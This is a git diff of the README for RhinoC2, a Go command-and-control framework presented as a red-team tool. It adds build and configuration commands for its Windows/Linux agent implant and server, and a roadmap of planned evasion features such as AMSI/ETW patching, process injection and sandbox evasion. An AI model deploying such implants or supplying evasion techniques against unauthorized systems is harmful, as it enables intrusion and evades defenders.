@@ -1,10 +1,10 @@
 # RhinoC2
 
-## v1.1.0
+## v1.2.0
 
-A modular command and control framework built in Go for penetration testing and authorized red team operations. Features encrypted agent communications, multi-session management, privilege detection, and a clean web interface for operator control.
+A modular command and control framework built in Go for penetration testing and authorized red team operations. Features encrypted agent communications, multi-session management, privilege detection, runtime configuration, and a clean web interface for operator control.
 
-> **⚠️ Detection Warning:** v1.1.0 is highly detectable by modern endpoint protection. No obfuscation, evasion, or OPSEC features are implemented. This version is for educational purposes and controlled lab environments only. Production evasion capabilities are planned for v1.3+.
+> **⚠️ Detection Warning:** v1.2.0 is highly detectable by modern endpoint protection. No obfuscation, evasion, or OPSEC features are implemented. This version is for educational purposes and controlled lab environments only. Production evasion capabilities are planned for v1.3+.
 
 ## What is this?
 
@@ -99,15 +99,46 @@ Multiple methods to maintain access:
 ### Building for Windows
 
 Build for all Windows platforms:
+
 ```powershell
 .\build.ps1 -Target all
 ```
 
 Or build specific targets:
+
 ```powershell
 .\build.ps1 -Target agent -OS windows -Arch amd64
 .\build.ps1 -Target agent -OS windows -Arch 386
 ```
+
+### Using the Builder Tool
+
+**Build the builder first** (this makes subsequent builds much faster):
+
+```powershell
+go build -ldflags "-s -w" -o builder.exe cmd/builder/main.go
+```
+
+Now use the compiled builder (0.9 seconds vs 2+ minutes with `go run`):
+
+```powershell
+# Build server
+.\builder.exe build server
+
+# Build agent with default config (runtime configurable)
+.\builder.exe build agent windows amd64
+
+# Build agent with embedded config
+.\builder.exe build agent windows amd64 --server ws://192.168.1.100:8443/api/agent --key YourKey --interval 10
+
+# Build for Linux
+.\builder.exe build agent linux amd64
+
+# View all options
+.\builder.exe help
+```
+
+**Performance tip:** Always use the compiled `builder.exe` instead of `go run cmd/builder/main.go` for 100x faster builds.
 
 ## Testing
 
@@ -118,21 +149,96 @@ Run the test suite to verify everything works:
 
 ## Configuration
 
-Before using this in any real scenario, update the default settings:
+RhinoC2 v1.2.0 is fully configurable without editing source code. Configuration supports CLI flags, environment variables, and JSON config files.
 
-**Change the encryption key** in both `server/server.go` and `agent/agent.go`:
-```go
-key := "YourCustomKey32BytesLongHere"
+### Quick Start
+
+**Generate configuration files:**
+```powershell
+go run cmd/config/main.go
 ```
 
-**Set your server address** in `agent/agent.go`:
-```go
-serverURL := "ws://your-server-ip:8443/api/agent"
+This creates configuration files in multiple formats (JSON, ENV, Go constants).
+
+### Agent Configuration
+
+**Method 1: Command-line flags**
+```powershell
+agent.exe -server ws://192.168.1.100:8443/api/agent -key YourSecretKey -interval 10
 ```
 
-**Adjust beacon interval** if needed:
-```go
-Interval: 30 * time.Second
+**Method 2: Environment variables**
+```powershell
+$env:RHINO_SERVER="ws://192.168.1.100:8443/api/agent"
+$env:RHINO_KEY="YourSecretKey"
+$env:RHINO_INTERVAL="10"
+.\agent.exe
+```
+
+**Method 3: JSON config file**
+```powershell
+.\agent.exe -config agent_config.json
+```
+
+Example `agent_config.json`:
+```json
+{
+  "server": "ws://192.168.1.100:8443/api/agent",
+  "key": "YourSecretKey",
+  "interval": 10
+}
+```
+
+**Method 4: Build with embedded defaults**
+```powershell
+.\builder.exe build agent windows amd64 --server ws://192.168.1.100:8443/api/agent --key YourSecretKey --interval 10
+```
+
+### Server Configuration
+
+**Method 1: Command-line flags**
+```powershell
+server.exe -port 9000 -host 0.0.0.0 -key YourSecretKey
+```
+
+**Method 2: Environment variables**
+```powershell
+$env:RHINO_PORT="9000"
+$env:RHINO_HOST="0.0.0.0"
+$env:RHINO_KEY="YourSecretKey"
+.\server.exe
+```
+
+**Method 3: JSON config file**
+```powershell
+.\server.exe -config server_config.json
+```
+
+Example `server_config.json`:
+```json
+{
+  "port": "9000",
+  "host": "0.0.0.0",
+  "key": "YourSecretKey"
+}
+```
+
+### Configuration Priority
+
+When multiple configuration methods are used, the following priority applies:
+1. **CLI flags** (highest priority)
+2. **Environment variables**
+3. **Config file**
+4. **Build-time embedded defaults**
+5. **Hard-coded defaults** (lowest priority)
+
+### Help
+
+View all available options:
+```powershell
+.\agent.exe -help
+.\server.exe -help
+.\builder.exe help
 ```
 
 ## Important Notes
@@ -158,14 +264,22 @@ The modular structure makes it straightforward to add functionality without touc
 
 ## Roadmap
 
-### v1.2.0 (Planned)
-- **Advanced persistence mechanisms** - WMI event subscriptions and service installation
-- **Credential harvesting** - LSASS dumping and browser credential extraction
-- **Network pivoting** - SOCKS proxy and port forwarding capabilities
-- **Screenshot capture** - Remote desktop monitoring
-- **Keylogging** - Input monitoring for target systems
+### v1.2.0 (Current)
+- ✓ **Full runtime configuration** - CLI flags, environment variables, JSON config files
+- ✓ **Build-time configuration** - Embed defaults at compile time
+- ✓ **Configuration generator** - Interactive tool for creating configs
+- ✓ **Optimized builder** - 100x faster builds with compiled builder binary
+- ✓ **Priority configuration system** - CLI > env vars > config file > embedded > defaults
+
+### v1.3.0 (Planned)
 - **Process injection** - Migrate into other processes for stealth
-- **Anti-analysis** - VM and sandbox detection with automatic termination
+- **AMSI/ETW patching** - Bypass Windows security telemetry
+- **String obfuscation** - Runtime deobfuscation of static strings
+- **Syscall execution** - Direct syscalls to avoid API hooking
+- **Sleep obfuscation** - Encrypt agent memory during sleep
+- **API hashing** - Dynamic API resolution via hash
+- **Anti-debugging** - Detect and evade debuggers
+- **Sandbox evasion** - Enhanced VM/sandbox detection with behavior triggers
 
 ## Legal
 
